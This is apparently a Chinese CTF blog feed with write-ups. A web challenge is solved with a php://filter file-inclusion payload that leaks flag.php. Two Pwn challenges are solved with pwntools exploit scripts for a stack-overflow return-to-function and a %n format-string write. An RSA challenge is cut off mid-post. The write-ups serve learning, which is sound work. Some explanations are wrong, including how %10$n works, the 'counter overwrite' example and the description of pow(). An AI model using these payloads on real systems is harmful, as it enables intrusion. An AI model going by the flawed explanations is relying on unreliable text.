alt="img"></p><p>点击这个SECRET并没有发生什么，后面倒是说“查阅结束”，那么就说明，速度很快，肉眼看不到，那我们就要借用工具burpsuite。首先下开启代理服务器</p><h3 id="3-使用burpsuite"><a href="#3-使用burpsuite" class="headerlink" title="3.使用burpsuite"></a>3.使用burpsuite<img src="https://img-blog.csdnimg.cn/img_convert/ec786b401fe133c346e66ee47ba7a2ab.png" alt="img"></h3><p><img src="https://img-blog.csdnimg.cn/img_convert/efb7f0e3de717041c1ac19d352dbbc9a.png" alt="img"></p><p>进入到这个界面，软件中应该显示出获取的信息，点击forward直到信息中出现action.php(根据源代码提示)</p><p><img src="https://img-blog.csdnimg.cn/img_convert/906cd9cf375e974f7f0ec1d4740c68a2.png" alt="img"></p><p>接着将这串数据发送到repeater，在repeater里我们点击Go就进入到下面的界面</p><p><img src="https://img-blog.csdnimg.cn/img_convert/ca09d303bef3505fbb8cea397dd330fb.png" alt="img"></p><p>后面的话我们就可以输入网址<a href="http://78b3b06a-804f-46c6-8d85-8635948e27ad.node4.buuoj.cn/secr3t.php%E5%8F%AF%E4%BB%A5%E6%9F%A5%E7%9C%8B%E6%BA%90%E4%BB%A3%E7%A0%81%EF%BC%88%E8%AE%B0%E7%9D%80%E8%A6%81%E5%B0%86burpsuite%E5%92%8C%E5%B1%80%E5%9F%9F%E7%BD%91%E5%85%B3%E9%97%AD%EF%BC%8C%E5%90%A6%E5%88%99%E6%98%AF%E6%89%93%E4%B8%8D%E5%BC%80%E7%9A%84%EF%BC%89">http://78b3b06a-804f-46c6-8d85-8635948e27ad.node4.buuoj.cn/secr3t.php可以查看源代码（记着要将burpsuite和局域网关闭，否则是打不开的）</a></p><p><img src="https://img-blog.csdnimg.cn/img_convert/c1b5cbae463c8b351a02d691e55dc88b.png" alt="img"></p><h3 id="4-代码解释"><a href="#4-代码解释" class="headerlink" title="4.代码解释"></a>4.代码解释</h3><p>这是一个PHP脚本，以HTML标签开头。该脚本包含了一个PHP函数 <code>highlight_file(__FILE__)</code>，该函数可以高亮正在执行的PHP代码。</p><p>然后，该脚本设置了 <code>error_reporting(0)</code>，以关闭错误报告。</p><p>该脚本通过 <code>$_GET</code> 超全局变量接收一个文件名作为参数。然后它检查文件名是否包含以下任何字符串： “..&#x2F;“、”tp”、”input” 或 “data”。如果包含，则脚本会打印 “Oh no!” 并退出。这是一种安全措施，用于防止目录遍历攻击并保护服务器免受恶意文件包含的攻击。</p><p>如果文件名通过了安全检查，该脚本将使用 <code>include</code> 语句包含该文件。被包含的文件的内容将作为PHP代码执行。</p><p>标志存储在名为 “flag.php” 的文件中，该文件可能由此脚本包含。</p><h3 id="5-PHP伪协议"><a href="#5-PHP伪协议" class="headerlink" title="5.PHP伪协议"></a>5.PHP伪协议</h3><p>看到flag.php应该联想到<a href="https://segmentfault.com/a/1190000018991087">php伪协议</a>，在后面加上<br>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php即可。</p><p>这是因为 php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode 是一种 PHP 伪协议，用于将文件转换为 base64 格式。通过在 $_GET 超全局变量中传递 file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php，我们可以读取 flag.php 文件的内容并将其转换为 base64 格式。然后，我们可以将该内容解码并查看其中是否包含有用的信息。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/d215ff68e0fb087898bcc6696330a751.png" alt="img"></p><p>就会给出一堆符号的组合，显然这是base64的密文，接着在base64解密下即可求得flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7Mzk2MDEzYmItZjRkNC00NThjLWJmYWItYzhmODk4ZmI4Zjc0fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=</span><br></pre></td></tr></table></figure><h3 id="6-解密得到flag"><a href="#6-解密得到flag" class="headerlink" title="6.解密得到flag"></a>6.解密得到flag</h3><p>base64在线解密网址：<a href="http://www.jsons.cn/base64/">http://www.jsons.cn/base64/</a></p><p><img src="https://img-blog.csdnimg.cn/img_convert/ee9459a1e82c5da4c32442d8ca09f316.png" alt="img"></p><p>flag为flag{396013bb-f4d4-458c-bfab-c8f898fb8f74}</p><h2 id="7、总结"><a href="#7、总结" class="headerlink" title="7、总结"></a>7、总结</h2><p>在做这道题的时候，主要是会使用burpsuite工具，并且还要了解PHP伪协议的一些知识及概念，最后还用到了一些密码里的base64，这些都需要了解一下。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome&lt;/p&gt;
&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h1 id=&quot;一、-极客大挑战-2019-Secret-File-1解题思路&quot;&gt;&lt;a href=&quot;#一、-极客大挑战-2019-Secret-File-1</summary>
      
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界Pwn</title>
    <link href="http://example.com/2023/03/05/pwn/"/>
    <id>http://example.com/2023/03/05/pwn/</id>
    <published>2023-03-04T21:23:01.422Z</published>
    <updated>2023-03-13T21:54:27.138Z</updated>
    
    <content type="html"><![CDATA[<p>Welcom</p><meta name="referrer" content="no-referrer"/><h1 id="一、level0"><a href="#一、level0" class="headerlink" title="一、level0"></a>一、level0</h1><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p><img src="https://img-blog.csdnimg.cn/img_convert/94804d959252e33b5031fb1d2f863cdf.png" alt="img"></p><h3 id="1-1用checksec查看"><a href="#1-1用checksec查看" class="headerlink" title="1.1用checksec查看"></a>1.1用checksec查看</h3><p>下载附件，使用checksec命令查看该程序是32位还是64位，开启了哪些保护。<img src="https://img-blog.csdnimg.cn/img_convert/f08a4f0a7f7d42a23a9dff948886153d.png" alt="img"></p><blockquote><p><strong>NX 代表 不可执行</strong> (non-executable) 。它通常在 CPU 层面上启用，因此启用 NX 的操作系统可以将某些内存区域标记为不可执行。通常，缓冲区溢出漏洞将恶意代码放在堆栈上，然后尝试执行它。但是，让堆栈这些可写区域变得不可执行，可以防止这种攻击。</p></blockquote><h3 id="1-2-ida"><a href="#1-2-ida" class="headerlink" title="1.2 ida"></a>1.2 ida</h3><p>接着我们将文件放到<strong>IDA</strong>64位里，用f5反汇编查看<img src="https://img-blog.csdnimg.cn/img_convert/81738c64d4ff827f301111ce6955c3b6.png" alt="img"></p><p>代码中提示有一个vulnerable_function()函数进入查看<img src="https://img-blog.csdnimg.cn/img_convert/6997c705143c0285f6d7c587636ab82c.png" alt="img"></p><p>显而易见此处存在栈溢出漏洞，buf的长度为128个字节（也就是0x80）但是read()函数允许往buf中输入<strong>0x200</strong>字节数据。</p><blockquote><p>&#x2F;bin&#x2F;sh是一个特殊的字符串，它代表了一个Unix&#x2F;Linux系统中的shell程序，通常是Bash。在pwn题中，攻击者可以通过控制程序的输入，将&#x2F;bin&#x2F;sh的地址作为参数传递给system函数或者execve函数，从而获取一个shell进程并执行命令。因此，&#x2F;bin&#x2F;sh通常被用于pwn题中的ROP（Return-oriented programming）或者其他代码执行漏洞的利用中。</p></blockquote><p>接着，我们shift+F12可以看到有个很可疑的&#x2F;bin&#x2F;sh，我们双击进去看看</p><p><img src="https://img-blog.csdnimg.cn/img_convert/81b14e74550c3baab9b5d056f7b658d7.png" alt="img"></p><p>接着我们点击那一行后面的<strong>callsystem</strong>进入它的函数体</p><p><img src="https://img-blog.csdnimg.cn/img_convert/cac97a368deb9ed60f0946301f9527a3.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/83f0a4d3a6264cb164ca2c775d3873b7.png" alt="img"></p><p>该函数调用了system(“&#x2F;bin&#x2F;sh”)我们可以利用此函数来get shell</p><h3 id="1-3整体思路："><a href="#1-3整体思路：" class="headerlink" title="1.3整体思路："></a><strong>1.3整体思路：</strong></h3><p><strong>是向buf处输入0x80字节的数据填满buf，此时在继续输入0x80字节的数据造成溢出覆盖ebp处的数据。</strong></p><p><strong>再继续输入数据把返回地址处的数据覆盖为callsystem()的地址，这样vulnerable_function()函数原本要返回到main()函数但是却返回到了callsystem()函数来执行callsystem()</strong></p><h3 id="1-4接下来开始写exp："><a href="#1-4接下来开始写exp：" class="headerlink" title="1.4接下来开始写exp："></a>1.4接下来开始写exp：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote (<span class="string">&#x27;61.147.171.105&#x27;</span>, <span class="number">54500</span>)<span class="comment">#连接远程</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./23&#x27;</span>)<span class="comment">#打开本地程序</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">0x8</span>) + p64(elf.symbols[<span class="string">&#x27;callsystem&#x27;</span>])<span class="comment">#构造payload 需要覆盖0x80个地址+上个ebp地址\# 输入payload来进行操作以拿到程序的shell payload一般等于 偏移量 + 地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello, World\n&quot;</span>)<span class="comment">#接收远程的返回</span></span><br><span class="line">p.send(payload)<span class="comment">#发送payload</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行脚本得到flag!</p><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20230228131023932.png" alt="image-20230228131023932"></p><p><strong>以下是我对上面exp的一些函数的总结，这也是我正在学习的象征，虽然只能做一些简单的题，不过我会加油的。</strong></p><p><strong>在编写pwn题的exp代码时，通常需要调试和测试代码，因此需要输出详细的日志信息。因此，<code>context.log_level=&quot;debug&quot;</code>可以帮助开发者更好地了解代码的执行过程和结果，从而更快地发现和解决问题。</strong></p><blockquote><p>**p.recvuntil(string)**是pwntools库中的一个函数，用于接收程序输出中的数据，直到包含指定字符串<code>string</code>的数据出现为止。具体来说，它会等待程序输出数据，并将数据缓存到一个数据缓冲区中，直到缓冲区中包含了指定的字符串<code>string</code>为止，然后返回缓冲区中的数据。如果程序输出中没有包含指定的字符串<code>string</code>，则<code>p.recvuntil(string)</code>会一直等待，直到超时或者接收到数据为止。如果超时，则会抛出一个异常。</p><p>在编写pwn题的exp代码时，通常需要从程序输出中获取一些敏感信息，例如栈指针、libc的基址等等。因此，可以使用<code>p.recvuntil(string)</code>函数接收程序输出中的数据，并从中提取需要的信息。通常情况下，需要多次使用<code>p.recvuntil(string)</code>函数接收程序输出中的数据，以便于获取完整的信息和数据。</p></blockquote><p><strong>需要注意的是，在使用<code>p.recvuntil(string)</code>函数时，需要确保指定的字符串<code>string</code>是唯一的，否则可能会导致接收到错误的数据或者超时。为了避免这种情况，可以使用一些特殊的字符串或者标记来区分不同的输出数据。另外，在实际使用中，需要根据程序的具体输出格式和漏洞类型，选择合适的接收函数和接收方式，以便于获取正确的数据并编写有效的exploit代码</strong>。</p><blockquote><p>**p.sendline(payload)**是pwntools库中的一个函数，用于向程序发送数据并添加一个换行符。具体来说，它会将指定的数据<code>payload</code>发送给程序，并在数据的末尾添加一个换行符<code>\n</code>，以便于模拟用户在终端中输入数据的行为。发送数据后，函数会等待程序的响应并将响应数据缓存到一个数据缓冲区中，然后返回缓冲区中的数据。如果程序没有响应或者响应超时，则会抛出一个异常。</p><p>在编写pwn题的exploit代码时，通常需要向程序发送一些特定的数据，例如缓冲区溢出的payload、格式化字符串的参数等等。使用<code>p.sendline(payload)</code>函数可以将这些数据发送给程序，并使用<code>\n</code>换行符模拟用户输入的行为。这样可以使payload或者输入数据更加真实和有效，从而更容易绕过一些安全保护和检测机制，例如ASLR和DEP等。</p></blockquote><p><strong>需要注意的是，在使用<code>p.sendline(payload)</code>函数时，需要确保发送的数据和换行符的格式是正确的，否则可能会导致程序崩溃或者无法正常运行。为了避免这种情况，可以使用一些特殊的字符或者标记来区分不同的数据，或者使用一些工具或者脚本来自动生成payload或者输入数据。另外，在实际使用中，需要根据程序的具体输入格式和漏洞类型，选择合适的发送函数和发送方式，以便于构造有效的exploit代码。</strong></p><h1 id="二、攻防世界-CGfsb"><a href="#二、攻防世界-CGfsb" class="headerlink" title="二、攻防世界-CGfsb"></a>二、攻防世界-CGfsb</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/82782dcc5dbbb6e04dfb0c6b48551031.png" alt="img"></p><h3 id="1-将文件拖入ubuntu用checksec检查保护"><a href="#1-将文件拖入ubuntu用checksec检查保护" class="headerlink" title="1.将文件拖入ubuntu用checksec检查保护"></a>1.将文件拖入ubuntu用checksec检查保护</h3><blockquote><ol><li><strong>arch：arch是“Architecture”的缩写，表示二进制文件编译时采用的CPU架构。在安全中，arch通常用于表示二进制的CPU架构是否是适合攻击者开发shellcode的目标，因为攻击者需要知道适合攻击平台的内存偏移量和指令。因此，对于一个给定的攻击目标，知道其CPU架构可以帮助攻击者更容易地开发成功的攻击。</strong></li><li><strong>prlro：prlro是“Partial Relro”的缩写，表示二进制是否启用了Partial Relocation Read-Only保护。这种保护机制可以阻止攻击者利用GOT表重定向攻击，因为GOT表的地址被设置为只读，攻击者无法修改它。启用PRLRO可以提高二进制的安全性。</strong></li><li><strong>sstack：sstack是“Stack Smashing Protection”的缩写，表示二进制是否启用了栈破坏保护。栈破坏是指攻击者利用缓冲区溢出漏洞来篡改函数返回地址，从而控制程序的执行流程。启用Sstack可以在执行返回前检查栈帧中的数据完整性，以避免栈破坏攻击。</strong></li><li><strong>nx：nx是“No Execute”的缩写，表示二进制是否启用了不可执行内存保护。不可执行内存的保护可以防止攻击者将指令载入到内存中，从而造成代码执行和攻击。启用NX可以防止许多基于内存的攻击，例如ROP攻击、缓冲区溢出等。</strong></li></ol></blockquote><p>如下图，我们发现PIE没有保护，全局变量的地址固定</p><p><img src="https://img-blog.csdnimg.cn/img_convert/58910593676779651934021c00647310.png" alt="img"></p><blockquote><p><strong>PIE”指的是“位置无关可执行文件”（Position-Independent Executable），它是一种可执行文件格式，可以在加载时动态地或静态地进行地址空间随机化。这使得攻击者更难利用缓冲区溢出等漏洞。因此，启用 PIE 可以提高程序的安全性。如果程序没有启用 PIE 保护，它的地址空间将始终是相同的，这意味着攻击者可以更容易地利用缓冲区溢出漏洞。</strong></p><p><strong>“全局变量地址固定”意味着全局变量在内存中的地址是固定的，不会在程序的不同运行中发生变化。这使得攻击者更容易利用全局变量的漏洞，例如缓冲区溢出。因此，在可能的情况下，应该尽量避免使用全局变量，或者使用一些技术来保护它们，例如限制它们的访问范围和使用堆栈内存而不是静态内存等。</strong></p></blockquote><h3 id="2-使用IDA"><a href="#2-使用IDA" class="headerlink" title="2.使用IDA"></a>2.使用IDA</h3><p>如下图<img src="https://img-blog.csdnimg.cn/img_convert/270dd1b463cd24c47f84a7758cf694b6.png" alt="img"></p><h3 id="3-代码解释"><a href="#3-代码解释" class="headerlink" title="3.代码解释"></a>3.代码解释</h3><blockquote><p><strong>提供的代码是一个 C 语言程序，它会提示用户输入姓名和一条消息，并且会打印一个个性化的问候语和用户输入的消息。</strong></p><p><strong>main<code>函数初始化了一些变量，包括一个大小为 2 的数组</code>buf<code>和一个大小为 100 的字符数组</code>s<code>。该函数使用 </code>setbuf&#96; 函数来禁用标准输入、输出和错误流的缓冲。</strong></p><p><strong>程序随后提示用户输入姓名，使用 <code>puts</code> 函数进行输出，并使用 <code>read</code> 函数将用户输入读取到 <code>buf</code> 数组中。然后程序再次提示用户输入消息，这次使用 <code>puts</code> 函数进行输出。用户输入的消息使用 <code>fgets</code> 函数读取到 <code>s</code> 数组中。</strong></p><p><strong>程序接下来使用 <code>printf</code> 函数，传递 <code>buf</code> 数组作为参数，打印个性化的问候语。用户输入的消息也使用 <code>printf</code> 函数进行输出。</strong></p><p><strong>最后，程序检查 <code>pwnme</code> 的值是否等于 8。如果是，则使用 <code>system</code> 函数执行命令 “cat flag” 并打印包含标志的消息。否则，程序打印一条感谢用户的消息。</strong></p></blockquote><p>但是，对于pwnme根本没有被赋值，所以应该是赋给pwnme一个8的值，但是实在是没有发现什么关于栈溢出的地方，只好寻求大佬帮忙，然后发现说是<strong>格式化字符串漏洞</strong></p><p>作为菜鸡的我不了解（；´д｀）ゞ，我就上网查资料。如下：</p><blockquote><p><strong>格式化字符串漏洞是一种常见的安全漏洞，可以利用程序中使用格式化字符串函数时的不当使用而进行攻击。格式化字符串函数（例如 printf 和 sprintf）将一个格式化字符串作为输入，并使用该字符串格式化并打印数据。攻击者可以构造一个恶意格式化字符串来读取或修改程序内存中的数据。这种攻击通常利用了格式化字符串中的格式控制符（例如 %s 和 %x）来读取或修改内存内容。为了防止这种漏洞，开发人员应该注意在使用格式化字符串函数时正确处理输入，并避免将用户输入作为格式化字符串的一部部分</strong></p><p><strong>对应代码的部分就是printf（&amp;s）;根据我们所学知识printf(“%s”,str);应该是这样所以我们可以通过构造合适的字符串，利用格式化字符串漏洞，实现读取、写入任意内存地址的数据等攻击</strong>。</p></blockquote><table><thead><tr><th>控制符</th><th align="center">描述</th></tr></thead><tbody><tr><td><strong><code>%c</code></strong></td><td align="center"><strong>输出一个字符</strong></td></tr><tr><td><strong><code>%d</code> &#x2F; <code>%i</code></strong></td><td align="center"><strong>输出一个十进制整数</strong></td></tr><tr><td><strong><code>%e</code> &#x2F; <code>%E</code></strong></td><td align="center"><strong>用科学计数法输出一个浮点数</strong></td></tr><tr><td><strong><code>%f</code> &#x2F; <code>%F</code></strong></td><td align="center"><strong>输出一个浮点数</strong></td></tr><tr><td><strong><code>%g</code> &#x2F; <code>%G</code></strong></td><td align="center"><strong>根据值的大小选择使用 <code>%f</code> 或 <code>%e</code></strong></td></tr><tr><td><strong><code>%o</code></strong></td><td align="center"><strong>输出一个八进制整数</strong></td></tr><tr><td><strong><code>%p</code> &#x2F; <code>%x</code> &#x2F; <code>%X</code></strong></td><td align="center"><strong>输出一个指针地址、十六进制整数</strong></td></tr><tr><td><strong><code>%s</code></strong></td><td align="center"><strong>输出一个字符串</strong></td></tr><tr><td><strong><code>%u</code></strong></td><td align="center"><strong>输出一个无符号十进制整数</strong></td></tr><tr><td><strong>%n</strong></td><td align="center"><strong>将已经输出的字符数保存到它所在的参数指针中</strong></td></tr></tbody></table><h3 id="4-找出偏移量"><a href="#4-找出偏移量" class="headerlink" title="4.找出偏移量"></a>4.找出偏移量</h3><p>我们就用%p来进行（加上\是为了好判断位置）</p><p><img src="https://img-blog.csdnimg.cn/img_convert/002c8d29489a193f136e540ff4330f89.png" alt="img"></p><p>如图所示，很明显了0x61616161就是aaaa，所以偏移量就是10</p><p>接下来我们就寻找pwnme的地址就可以了,根据下图我们找到了pwnme的地址为 0x0804A068</p><p><img src="https://img-blog.csdnimg.cn/img_convert/9a12ca74c2c8ba02416512e90fef6204.png" alt="img"></p><h3 id="5-编写exp"><a href="#5-编写exp" class="headerlink" title="5.编写exp"></a>5.编写exp</h3><p>完成上述之后我们就可以编写exp了，不过写了好久就是运行不出来，找资料了解到需要**%10$n**</p><blockquote><p><strong><code>%10$n</code> 是 C 语言中 printf 函数的一种格式化字符串控制符，用于将累计的输出字符数存储在指定的地址中。</strong></p><p><strong>具体来说，<code>%10$n</code> 的含义如下：</strong></p><ul><li><strong><code>%</code>：格式控制符的起始标识；</strong></li><li><strong><code>10</code>：指定要存储输出字符数的地址所占的空间大小，这里是 10 个字节；</strong></li><li><strong><code>$</code>：指定当前格式控制符要操作的参数的位置，这里是第几个参数；</strong></li><li><strong><code>n</code>：表示存储输出字符数的值到指定的地址中。</strong></li></ul><p><strong>由此可知，<code>%10$n</code> 可以通过格式化字符串漏洞来将输出字符的数量存储在指定的地址中。具体来说，攻击者在输入中添加格式化字符串 <code>%10$n</code>，程序在处理该字符串时，会将输出字符的数量写入位于 10 号参数指定的地址中。由于格式化字符串漏洞的特性，攻击者可以构造任意的地址，因此能够获取程序的代码执行过程中的一些敏感信息。</strong></p></blockquote><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;61.147.171.105&#x27;</span>, <span class="number">56813</span>)            </span><br><span class="line">payload = p32(<span class="number">0x0804A068</span>) + <span class="string">&#x27;ssss&#x27;</span> + <span class="string">&#x27;%10$n&#x27;</span>     </span><br><span class="line">p.recvuntil(<span class="string">&quot;please tell me your name:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;taozi&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;leave your message please:\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>如图：</p><h3 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://img-blog.csdnimg.cn/img_convert/c9c90083e39b86dd189ed1bd3df55220.png" alt="img"></h3><h3 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h3><p>做这道题的时候，对于<strong>格式化字符串</strong>的知识要有一定了解，不然的话，就要像我一样，忙来忙去，很麻烦的</p><p>如何利用格式化字符串呢？我做了一些知识总结。</p><p>格式化字符串攻击（Format String Vulnerabilities，简称FSV）是指攻击者通过构造恶意格式化字符串控制符，在程序中读写不该被访问的内存区域、获取敏感信息等操作。攻击者通常利用以下方式来实施格式化字符串攻击：</p><p>（1）打印栈上的数据</p><p>攻击者可以通过下面的格式化字符串来读取栈上的数据：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Copyprintf</span>(<span class="string">&quot;%s&quot;</span>, format_string);</span><br></pre></td></tr></table></figure><p>这个格式化字符串会将栈上的数据输出到终端上，攻击者可通过逐步构造格式化字符串，读取栈上的敏感信息，甚至是卡号等机密信息。</p><p>（2）任意地址写操作</p><p>攻击者可以利用 <code>%n</code>(表示输出到目前为止已输出的字符数到指定内存中)格式化字符串控制符来实现任意地址写操作。攻击者需要指定目标地址位置（任意写操作）的参数编号，以及欲写入的值。例如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Copyint x = <span class="number">10</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;test %x%n\n&quot;</span>, &amp;x, x);</span><br></pre></td></tr></table></figure><p>上例将变量 <code>x</code> 的地址作为参数，使其输出十六进制格式的地址，同时通过 <code>%n</code> 将已输出的字符数量写入到变量 <code>x</code> 中。由于攻击者可以构造目标地址参数，因此可以将任意值写入任意地址。</p><p>（3）格式化字符串覆盖计数器</p><p>格式化字符串的解析过程中需要一个计数器来记录当前处理的格式化字符串的位置，攻击者可以用格式化字符串覆盖计数器来对程序进行影响，例如覆盖 <code>printf()</code> 函数内的计数器 <code>number</code>，使其一直循环打印字符串：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Copyint number = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;test %d%n\n%s%6$d\n&quot;</span>, <span class="number">1</span>, &amp;number, <span class="string">&quot;hello&quot;</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br></pre></td></tr></table></figure><p>上例中，攻击者将变量 <code>number</code> 的地址作为参数，使其输出输出的数字 1，通过 <code>%n</code> 将输出字符数量写入变量 <code>number</code> 中。然后通过 <code>%s</code> 输出字符串 “hello”，同时用 <code>%6$d</code> 输出第 6 个参数的值（即数字 3），由于 <code>%6$d</code> 中的 $6 表示输出的是第 6 个参数，但是在前面已经输出了 1 个参数，因此将计数器覆盖为 1，从而打印死循环。</p><p>由于格式化字符串攻击可对程序构成严重威胁，因此应采取以下预防措施：</p><ol><li>不要相信用户提供的格式化字符串；</li><li>使用安全的输入输出函数，并严格限制输出字符串的长度；</li><li>不要让用户控制格式化字符串的转换说明符；</li><li>在开启编译选项 -Wall 的情况下编译程序，编译器会识别并警告存在的格式化字符串漏洞。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcom&lt;/p&gt;
&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h1 id=&quot;一、level0&quot;&gt;&lt;a href=&quot;#一、level0&quot; class=&quot;headerlink&quot; title=&quot;一、level0&quot;&gt;&lt;/a&gt;一</summary>
      
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    
    <category term="Pwn" scheme="http://example.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界Crypto</title>
    <link href="http://example.com/2023/03/05/Crypto/"/>
    <id>http://example.com/2023/03/05/Crypto/</id>
    <published>2023-03-04T21:22:43.435Z</published>
    <updated>2023-05-19T15:37:25.291Z</updated>
    
    <content type="html"><![CDATA[<p>Welcom</p><meta name="referrer" content="no-referrer"/><h1 id="一、攻防世界Crypto-初识rsa"><a href="#一、攻防世界Crypto-初识rsa" class="headerlink" title="一、攻防世界Crypto - 初识rsa"></a><strong>一、攻防世界Crypto - 初识rsa</strong></h1><h2 id="1-下载附件"><a href="#1-下载附件" class="headerlink" title="1.下载附件"></a>1.下载附件<img src="https://img-blog.csdnimg.cn/img_convert/4398c3e509a2988046a8dbdf26053428.png" alt="img"></h2><p>这是一道简单的rsa类型的题，我们下载附件后可以看到代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long,inverse,getPrime</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)<span class="comment">#bytes_to_long 是 Python 中的一个函数，用于将字节数组转换为整数</span></span><br><span class="line"><span class="comment">#在 RSA 加密和解密中，我们需要将明文和密文表示为一个整数。因此，在进行 RSA 加密和解密时，我们需要使用 bytes_to_long 将明文和密文转换为整数，使用 long_to_bytes 将整数转换为字节数组。</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)<span class="comment">#`pow` 是 Python 中的一个内置函数，用于计算一个数的幂。具体地，`pow(x, y, z)` 返回的结果为 `x*y % z`。其中，`x` 和 `y` 是整数，`z` 是可选的模数。</span></span><br><span class="line"></span><br><span class="line">pq = p*(q-<span class="number">1</span>)</span><br><span class="line">qp = q*(p-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;pq=&quot;</span>,pq)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;qp=&quot;</span>,qp)</span><br><span class="line"><span class="meta">... </span>...//代码给出了c、n、pq、qp的值 